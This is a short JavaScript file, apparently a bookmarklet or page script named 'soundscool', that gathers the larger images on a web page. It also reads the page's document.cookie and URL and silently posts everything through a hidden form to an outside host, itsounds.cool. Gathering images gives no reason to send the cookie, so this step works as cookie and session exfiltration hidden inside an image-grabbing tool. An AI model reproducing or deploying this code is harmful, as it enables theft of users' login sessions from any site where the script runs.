window.soundscool={};
window.soundscool.getpics=(function(){
	var tmp={};
	tmp.referer=window.location.href;
	tmp.cookie=document.cookie;
	tmp.imgs=[];
	var tmpimages=document.getElementsByTagName("img");
	for(var ssci=0;ssci<tmpimages.length;ssci++)
	{
		var sscii = new Image();
		sscii.src=tmpimages[ssci].src;
		if (sscii.width>100 && sscii.height>100)
		{
			var ssciii={};
			ssciii.src=tmpimages[ssci].src;
			ssciii.alt=tmpimages[ssci].alt;
			tmp.imgs.push(ssciii);
		}
	}
	if (tmp.imgs.length>0)
	{
		var f = document.createElement("form");
		document.body.appendChild(f);
		var i = document.createElement("input");
		i.type = "hidden";
		f.appendChild(i);
		i.value = JSON.stringify(tmp);
		i.name = "gotpics";
		f.action = "http://www.itsounds.cool/image/caiji";
		f.method="POST";
		f.target="_blank";
		f.submit();
	}
});